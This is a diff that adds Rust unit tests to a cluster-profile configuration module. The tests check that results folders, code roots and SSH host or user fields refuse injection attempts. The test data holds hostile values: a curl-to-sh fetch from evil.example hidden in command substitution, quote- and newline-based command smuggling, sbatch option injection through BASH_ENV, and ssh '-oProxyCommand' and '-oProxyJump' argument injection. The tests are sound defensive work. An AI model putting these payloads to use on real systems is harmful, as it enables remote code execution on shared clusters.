@@ -656,6 +656,154 @@ mod tests {
         assert!(entry.validate().is_err());
     }
 
+    fn fixture_entries() -> Vec<(&'static str, ServerEntry)> {
+        [
+            (
+                "cluster-a",
+                include_str!(concat!(
+                    env!("CARGO_MANIFEST_DIR"),
+                    "/tests/fixtures/hpc/cluster-a.json"
+                )),
+            ),
+            (
+                "cluster-b",
+                include_str!(concat!(
+                    env!("CARGO_MANIFEST_DIR"),
+                    "/tests/fixtures/hpc/cluster-b.json"
+                )),
+            ),
+            (
+                "cluster-none",
+                include_str!(concat!(
+                    env!("CARGO_MANIFEST_DIR"),
+                    "/tests/fixtures/hpc/cluster-none.json"
+                )),
+            ),
+            (
+                "cluster-save",
+                include_str!(concat!(
+                    env!("CARGO_MANIFEST_DIR"),
+                    "/tests/fixtures/hpc/cluster-save.json"
+                )),
+            ),
+        ]
+        .into_iter()
+        .map(|(name, text)| {
+            (
+                name,
+                serde_json::from_str::<ServerEntry>(text).expect("fixture parses"),
+            )
+        })
+        .collect()
+    }
+
+    #[test]
+    fn saved_fixture_profiles_still_load_and_validate_as_before() {
+        let dir = temp_dir("fixtures");
+        let path = dir.join("servers.json");
+        let entries: Vec<ServerEntry> = fixture_entries()
+            .into_iter()
+            .map(|(_, entry)| entry)
+            .collect();
+        save_servers_to_path(&entries, &path).expect("save");
+        assert_eq!(load_servers_from_path(&path), entries);
+        for (name, entry) in fixture_entries() {
+            match name {
+                // The save e2e fixture is deliberately incomplete until the user
+                // types the interpreter; that is the only thing refused.
+                "cluster-save" => {
+                    let error = entry.validate().expect_err("no interpreter yet");
+                    assert!(error.contains("command that starts coperceive"), "{error}");
+                }
+                _ => entry
+                    .validate()
+                    .unwrap_or_else(|error| panic!("{name} must still validate: {error}")),
+            }
+        }
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn entry_validation_refuses_script_breaking_results_and_code_roots() {
+        for bad in [
+            "/data/lab/x$(curl${IFS}-fsS${IFS}evil.example|sh)",
+            "/data/lab/x`id`",
+            "/data/lab/x\";touch marker;\"",
+            "/data/lab/x\\y",
+            "/dev/null\necho INJECTED_LINE_RAN #",
+        ] {
+            let mut results = sample_entry("Cluster A", "cluster-a");
+            results.profile.results_root = bad.to_string();
+            let error = results.validate().expect_err(bad);
+            assert!(error.contains("results folder"), "{bad:?}: {error}");
+
+            let mut code = sample_entry("Cluster A", "cluster-a");
+            code.profile.code_roots = vec![bad.to_string()];
+            let error = code.validate().expect_err(bad);
+            assert!(error.contains("code folder"), "{bad:?}: {error}");
+        }
+        let mut tilde = sample_entry("Cluster A", "cluster-a");
+        tilde.profile.results_root = "~/results".to_string();
+        let error = tilde.validate().expect_err("~ results root");
+        assert!(error.contains("absolute path"), "{error}");
+    }
+
+    #[test]
+    fn entry_validation_refuses_a_results_root_that_sbatch_would_split() {
+        // sbatch splits `#SBATCH --output=<results_root>/...` at whitespace and
+        // ends it at '#', so each of these would add sbatch options (or break
+        // the line) instead of naming one folder.
+        for bad in [
+            "/dev/null --export=ALL,BASH_ENV=/data/lab/evil.sh #",
+            "/data/lab/r --chdir=/data/lab/evil --comment=x",
+            "/data/My Lab/runs",
+            "/data/o'brien/runs",
+            "/data/lab#2/runs",
+        ] {
+            let mut results = sample_entry("Cluster A", "cluster-a");
+            results.profile.results_root = bad.to_string();
+            let error = results.validate().expect_err(bad);
+            assert!(error.contains("results folder"), "{bad:?}: {error}");
+            assert!(error.contains("spaces, '#' or quotes"), "{bad:?}: {error}");
+        }
+        // A code root with a space is a shell-quoted argument, never an
+        // #SBATCH value, so it still validates.
+        let mut code = sample_entry("Cluster A", "cluster-a");
+        code.profile.code_roots = vec!["/data/My Lab/code".to_string()];
+        code.validate().expect("a code root with a space");
+    }
+
+    #[test]
+    fn typed_host_user_and_alias_may_not_start_with_a_dash() {
+        let mut alias = sample_entry("Cluster A", "-oProxyCommand=touch /tmp/marker");
+        assert!(alias.validate().unwrap_err().contains("'-'"));
+        alias.profile.ssh_alias = Some("cluster-a".to_string());
+        alias.validate().expect("plain alias");
+
+        let mut typed = ServerEntry::new(profile_from_typed_host(
+            "Typed",
+            "-oProxyCommand=touch /tmp/marker",
+            None,
+        ));
+        typed.profile.data_roots = vec!["/data/scenes".to_string()];
+        typed.profile.scratch_template = "/scratch/$USER".to_string();
+        typed.profile.results_root = "/data/results".to_string();
+        assert!(typed.validate().unwrap_err().contains("'-'"));
+        assert!(typed.ssh_target().is_err(), "never handed to ssh");
+
+        typed.profile.host = Some("login.example".to_string());
+        typed.profile.user = Some("-oProxyJump=x@evil.example,y".to_string());
+        assert!(typed.validate().unwrap_err().contains("'-'"));
+        assert!(typed.ssh_target().is_err(), "never handed to ssh");
+
+        typed.profile.user = Some("alice".to_string());
+        typed.validate().expect("plain typed host");
+        assert_eq!(
+            typed.ssh_target().expect("target").destination,
+            "alice@login.example"
+        );
+    }
+
     #[test]
     fn rejects_schedulerless_profile_with_partition() {
         let mut entry = sample_entry("Files only", "files-only");
